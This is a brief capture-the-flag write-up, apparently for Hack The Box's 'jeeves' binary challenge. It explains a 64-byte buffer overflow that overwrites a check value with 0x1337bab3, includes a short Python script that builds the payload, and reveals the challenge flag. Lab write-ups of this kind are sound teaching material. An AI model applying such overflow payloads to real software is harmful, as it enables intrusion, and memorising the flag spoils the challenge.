---
title: jeeves
description: buffer overflow
tags: binary, buffer overflow, jeeves
---

This challenge was pretty simple. A quick look at the main function revealed that the buffer is 64 bytes, and there was a check for the value 0x1337bab3 at the end of the buffer. It's also important to note that the malloc, open, and read function calls are used to store the value of the flag and are not relevant for the exploit itself. 

```python 
buf_size = 64
# 1337bab3
payload = b'A' * 60 + b'\xb3\xba\x37\x13\n' 
with open ('payload.hex', 'wb') as f:
	f.write(payload)
```

<img src = "/csec-writeups/hackthebox/htb-binary/jeeves.png" />

The flag is HTB{w3lc0me\_t0\_lAnd\_0f\_pwn\_&\_pa1n!}.